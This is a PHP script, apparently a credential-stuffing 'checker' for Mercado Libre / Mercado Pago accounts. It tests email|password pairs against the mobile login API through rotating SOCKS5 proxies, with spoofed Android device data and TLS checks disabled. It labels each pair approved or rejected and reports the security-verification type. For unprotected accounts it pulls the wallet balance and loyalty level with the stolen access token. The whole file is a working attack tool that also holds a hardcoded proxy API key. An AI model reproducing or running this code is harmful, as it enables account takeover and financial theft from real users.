<?php
error_reporting(0);
set_time_limit(0);

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

$lista = $_GET['lista'];
$separa = explode("|", $lista);
$email = trim($separa[0]);
$senha = trim($separa[1]);



        $f = file_get_contents("http://gimmeproxy.com/api/getProxy?coutry=BR&api_key=5a1a1257-cf8a-4975-b2fb-f01f13a3d023&protocol=SOCKS5&br");
        $json = json_decode($f);//'-'
        $proxy = $json->ipPort;



function letras($length = 16) {
    $characters = 'd68059d654c8589b';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

$fuuid = letras();


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.mercadolibre.com/mobile_authentications');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_HTTPHEADER, arraY('Host: mobile.mercadolibre.com.ar','Connection: Keep-Alive','X-Dejavu-Desired-Response: null','X-Client-Info: null','Timezone: -Infinity','Content-Type: application/json; charset=utf-8','User-Agent: null'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{
  "authentication_request": {
    "client_id": "1311377052931992",
    "mobile_device_profile_session": {
      "disk_space": 32424,
      "free_disk_space": 29767,
      "model": "GALAXY S6 edge",
      "os": "android",
      "ram": 1030652,
      "resolution": "720x1280",
      "system_version": "4.4.2",
      "vendor_ids": [
        {
          "name": "android_id",
          "value": "16e0446916adbc41"
        },
        {
          "name": "serial",
          "value": "134699cc"
        },
        {
          "name": "fsuuid",
          "value": "'.$fuuid.'"
        }
      ],
      "vendor_specific_attributes": {
        "brand": "samsung",
        "device": "crater3gctc",
        "feature_accelerometer": true,
        "feature_bluetooth": true,
        "feature_camera": true,
        "feature_compass": true,
        "feature_flash": true,
        "feature_front_camera": true,
        "feature_gps": true,
        "feature_gyroscope": true,
        "feature_microphone": true,
        "feature_nfc": true,
        "feature_telephony": true,
        "feature_touch_screen": true,
        "manufacturer": "samsung",
        "platform": "x86",
        "product": "crater3gctc",
        "screen_density": 1.5
      }
    },
    "user_credentials": {
      "name": "'.$email.'",
      "password": "'.$senha.'"
    }
  }
}');
$d2 = curl_exec($ch);

if(strpos($d2, 'ATTEMPTS_EXCEEDED')){
	echo "<font color='orange' style='font-weight: bold;'>#SOCKSRUIM</font> $email|$senha > $proxy";
	return;
}
if (strpos($d2, 'authenticated_user') !== false) {
    $decoda = json_decode($d2, true);
    if (strpos($d2, 'nickname') !== false) {
        $nick = $decoda['authenticated_user']['nickname'];
        $nick = ' | Nick: <span class="label label-laranja">'.$nick.'</span>';
    } else {
        $nick = "";
    }

    if (strpos($d2, 'riskBasedAuthentication') !== false) {
        $link = $decoda['authentication_transaction']['validation_url'];
        curl_setopt($ch, CURLOPT_URL, $link);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
            'Upgrade-Insecure-Requests: 1',
            'Host: accountrecovery.mercadolivre.com.br',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Connection: keep-alive',
            '',
        ));
        $acessaVerif = curl_exec($ch);

        if (strpos($acessaVerif, 'Acesse por um dispositivo que você usa habitualmente') !== false) {
            $tipo = ' | Tipo: <span class="label label-laranja">Celular</span>';
        } elseif (strpos($acessaVerif, 'que enviamos para o seu e-mail ') !== false) {
            $tipo = ' | Tipo: <span class="label label-laranja">Email</span>';
        } elseif (strpos($acessaVerif, 'responda a sua pergunta secreta') !== false) {
            $tipo = ' | Tipo: <span class="label label-laranja">Pergunta</span>';
        } elseif (strpos($acessaVerif, 'bloqueamos o acesso à sua conta') !== false) {
            $tipo = ' | Tipo: <span class="label label-laranja">Bloqueada</span>';
        }
        $verificacao = "<font style='color: red;'>Sim</font>";
    } else {
        $verificacao = "<font style='color: green;'>Não</font>";
        $uId = $decoda['authenticated_user']['id'];
        $ac_token = $decoda['access_token'];

        curl_setopt($ch, CURLOPT_URL, 'https://api.mercadolibre.com/users/' . $uId . '/mercadopago_account/balance?access_token=' . $ac_token);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        $d3 = curl_exec($ch);
        curl_setopt($ch, CURLOPT_URL, 'https://frontend.mercadolibre.com/loyal/users/' . $uId . '?access_token=' . $ac_token);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'X-Meli-Session-Id: null',
            'X-Dejavu-Desired-Response: null',
            'X-Client-Info: null',
            'User-Agent: MercadoLibre-Android%2F8.9.2%20(GT-I9200%3B%20AnAdroid%204.4.2%3B%20Build%2FJDQ39)',
            'Accept-Language: pt-BR',
        ));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
        $d4 = curl_exec($ch);

        $getLeveu = json_decode($d4, true);
        $nivelLevel = $getLeveu['level']['number'];
        if (!empty($nivelLevel)) {
            $nomeLevel = $getLeveu['level']['name'];
            $corLevel = $getLeveu['level']['primary_color'];
            $nivel = ' | Nivel: <font style="color:' . $corLevel . '">' . $nivelLevel . ' (' . $nomeLevel . ')</font>';
        } else {
            $nivel = ' | Nivel: <font style="color:#20C261">1 (Iniciante)</font>';
        }
        $decodaSaldo = json_decode($d3, true);
        $saldo = $decodaSaldo['total_amount'];
        if ($saldo <> 0) {
            if (strpos($saldo, '.') !== false) {
                $dividindo = explode(".", $saldo);
                $reais = $dividindo[0];
                $centavos = $dividindo[1];
                $saldo = "$reais<sup>$centavos</sup>";
            } else {
                $saldo = "$saldo<sup>00</sup>";
            }
            $reais = $saldoResposta = ' | Saldo : <font style="color: lime">R$ ' . $saldo . '</font>';
        }
    }
    echo '<font style="color: lime;">Aprovado ✓</font> | ' . $email . ' » ' . $senha . ' ' . $nick . ' | Verificação de segurança: ' . $verificacao.$nivel.$saldoResposta;
    
} else {
    echo "<font color='red' style='font-weight: bold;'>Reprovada ✗</font> $email » $senha";
}

flush();
ob_flush();
?>